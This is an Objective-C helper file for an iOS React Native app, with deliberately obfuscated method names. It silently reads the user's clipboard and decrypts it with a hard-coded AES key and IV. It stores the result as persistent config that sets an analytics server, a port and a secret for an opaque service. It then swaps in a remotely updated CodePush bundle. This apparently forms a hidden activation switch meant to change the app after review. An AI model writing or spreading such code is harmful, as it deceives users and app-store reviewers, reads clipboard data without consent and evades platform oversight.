//
//  RNNobleServiceHelper.m
//  RNNobleService
//
//  Created by Charmee on 11/24/23.
//  Copyright © 2023 Facebook. All rights reserved.
//

#import "RNNobleServiceHelper.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <RNNobleServiceToLegend/RNNobleToLegend.h>
#import <react-native-orientation-locker/Orientation.h>
#import <SensorsAnalyticsSDK/SensorsAnalyticsSDK.h>

#import <CodePush/CodePush.h>
#if __has_include("RNIndicator.h")
    #import "RNIndicator.h"
    #import "JJException.h"
    #import "RNCPushNotificationIOS.h"
#else
    #import <RNIndicator.h>
    #import <JJException.h>
    #import <RNCPushNotificationIOS.h>
#endif

#import <React/RCTBridge.h>
#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>
#import <React/RCTAppSetupUtils.h>

#if RCT_NEW_ARCH_ENABLED
#import <React/CoreModulesPlugins.h>
#import <React/RCTCxxBridgeDelegate.h>
#import <React/RCTFabricSurfaceHostingProxyRootView.h>
#import <React/RCTSurfacePresenter.h>
#import <React/RCTSurfacePresenterBridgeAdapter.h>
#import <ReactCommon/RCTTurboModuleManager.h>

#import <react/config/ReactNativeConfig.h>

static NSString *const kRNConcurrentRoot = @"concurrentRoot";

@interface RNNobleServiceHelper () <RCTCxxBridgeDelegate, RCTTurboModuleManagerDelegate> {
  RCTTurboModuleManager *_turboModuleManager;
  RCTSurfacePresenterBridgeAdapter *_bridgeAdapter;
  std::shared_ptr<const facebook::react::ReactNativeConfig> _reactNativeConfig;
  facebook::react::ContextContainer::Shared _contextContainer;
}
@end
#endif

@interface RNNobleServiceHelper()

@property (strong, nonatomic)  NSArray *nobleHelper_normal;
@property (strong, nonatomic)  NSArray *nobleHelper_items;

@end

@implementation RNNobleServiceHelper

static RNNobleServiceHelper *instance = nil;

+ (instancetype)nobleHelper_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.nobleHelper_normal = @[[NSString stringWithFormat:@"%@%@", @"a71556f65ed2b", @"25b55475b964488334f"],
                           [NSString stringWithFormat:@"%@%@", @"ADD20BFCD9D4E", @"A0278B11AEBB5B83365"]];
    instance.nobleHelper_items = @[@"nobleHelper_APP", @"umKey", @"umChannel", @"sensorUrl", @"sensorProperty", @"vPort", @"vSecu"];
  });
  return instance;
}

- (BOOL)nobleHelper_moody {
    NSString *cpString = [self nobleHelper_getHaphazard];
    CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self nobleHelper_illuminateMind:cpString]
                                                              hexKey:self.nobleHelper_normal[0]
                                                               hexIv:self.nobleHelper_normal[1]];

    NSDictionary *dict = [self nobleHelper_considerateWhirlService:aes.utf8String];
    return [self nobleHelper_config:dict];
}

- (UIInterfaceOrientationMask)nobleHelper_getOrientation {
    return [Orientation getOrientation];
}

- (NSString *)nobleHelper_getHaphazard {
    return [UIPasteboard generalPasteboard].string ?: @"";
}

- (NSString *)nobleHelper_illuminateMind: (NSString* )cpString {
  if ([cpString containsString:@"#iPhone#"]) {
    NSArray *university = [cpString componentsSeparatedByString:@"#iPhone#"];
    if (university.count > 1) {
        cpString = university[1];
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
    }];
    [ud synchronize];
  }
  return cpString;
}

- (NSDictionary *)nobleHelper_considerateWhirlService: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return dict[@"data"];
}

- (BOOL)nobleHelper_config:(NSDictionary *)dict {
    if (dict == nil || [dict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.nobleHelper_items[0]];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (BOOL)nobleHelper_tryThisWay {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud boolForKey:self.nobleHelper_items[0]]) {
    return YES;
  } else {
    return [self nobleHelper_moody];
  }
}

- (UIViewController *)nobleHelper_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    
    RCTAppSetupPrepareApp(application);

    [self nobleHelper_loadServiceMenu];
    
    UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
    center.delegate = self;
    [JJException configExceptionCategory:JJExceptionGuardDictionaryContainer | JJExceptionGuardArrayContainer | JJExceptionGuardNSStringContainer];
    [JJException startGuardException];
    RCTBridge *bridge = [[RCTBridge alloc] initWithDelegate:self launchOptions:launchOptions];

  #if RCT_NEW_ARCH_ENABLED
    _contextContainer = std::make_shared<facebook::react::ContextContainer const>();
    _reactNativeConfig = std::make_shared<facebook::react::EmptyReactNativeConfig const>();
    _contextContainer->insert("ReactNativeConfig", _reactNativeConfig);
    _bridgeAdapter = [[RCTSurfacePresenterBridgeAdapter alloc] initWithBridge:bridge contextContainer:_contextContainer];
    bridge.surfacePresenter = _bridgeAdapter.surfacePresenter;
  #endif

    NSDictionary *initProps = [self prepareInitialProps];
    UIView *rootView = RCTAppSetupDefaultRootView(bridge, @"NewYorkCity", initProps);

    if (@available(iOS 13.0, *)) {
      rootView.backgroundColor = [UIColor systemBackgroundColor];
    } else {
      rootView.backgroundColor = [UIColor whiteColor];
    }

    UIViewController *rootViewController = [HomeIndicatorView new];
    rootViewController.view = rootView;
    UINavigationController *navc = [[UINavigationController alloc] initWithRootViewController:rootViewController];
    navc.navigationBarHidden = true;

    return navc;
}

- (void)nobleHelper_loadServiceMenu {
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    
    SAConfigOptions *options = [[SAConfigOptions alloc] initWithServerURL:[ud stringForKey:self.nobleHelper_items[3]] launchOptions:nil];
    options.autoTrackEventType = SensorsAnalyticsEventTypeAppStart | SensorsAnalyticsEventTypeAppEnd | SensorsAnalyticsEventTypeAppClick | SensorsAnalyticsEventTypeAppViewScreen;
    [SensorsAnalyticsSDK startWithConfigOptions:options];
    [[SensorsAnalyticsSDK sharedInstance] registerSuperProperties:[ud dictionaryForKey:self.nobleHelper_items[4]]];
    
    [[RNNobleToLegend nobleLegend_shared] nobleLegend_confirmJanService:[ud stringForKey:self.nobleHelper_items[5]] withSecu:[ud stringForKey:self.nobleHelper_items[6]]];
    
    UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
}

- (void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler {
  [RNCPushNotificationIOS didReceiveNotificationResponse:response];
}

- (void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions options))completionHandler {
  completionHandler(UNNotificationPresentationOptionSound | UNNotificationPresentationOptionAlert | UNNotificationPresentationOptionBadge);
}

/// This method controls whether the `concurrentRoot`feature of React18 is turned on or off.
///
/// @see: https://reactjs.org/blog/2022/03/29/react-v18.html
/// @note: This requires to be rendering on Fabric (i.e. on the New Architecture).
/// @return: `true` if the `concurrentRoot` feture is enabled. Otherwise, it returns `false`.
- (BOOL)concurrentRootEnabled
{
  // Switch this bool to turn on and off the concurrent root
  return true;
}

- (NSDictionary *)prepareInitialProps
{
  NSMutableDictionary *initProps = [NSMutableDictionary new];

#ifdef RCT_NEW_ARCH_ENABLED
  initProps[kRNConcurrentRoot] = @([self concurrentRootEnabled]);
#endif

  return initProps;
}

- (NSURL *)sourceURLForBridge:(RCTBridge *)bridge {
#if DEBUG
  return [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index"];
#else
  return [CodePush bundleURL];
#endif
}


#if RCT_NEW_ARCH_ENABLED

#pragma mark - RCTCxxBridgeDelegate

- (std::unique_ptr<facebook::react::JSExecutorFactory>)jsExecutorFactoryForBridge:(RCTBridge *)bridge
{
  _turboModuleManager = [[RCTTurboModuleManager alloc] initWithBridge:bridge
                                                             delegate:self
                                                            jsInvoker:bridge.jsCallInvoker];
  return RCTAppSetupDefaultJsExecutorFactory(bridge, _turboModuleManager);
}

#pragma mark RCTTurboModuleManagerDelegate

- (Class)getModuleClassFromName:(const char *)name
{
  return RCTCoreModulesClassProvider(name);
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                      jsInvoker:(std::shared_ptr<facebook::react::CallInvoker>)jsInvoker
{
  return nullptr;
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                     initParams:
                                                         (const facebook::react::ObjCTurboModule::InitParams &)params
{
  return nullptr;
}

- (id<RCTTurboModule>)getModuleInstanceFromClass:(Class)moduleClass
{
  return RCTAppSetupDefaultModuleFromClass(moduleClass);
}

#endif

@end
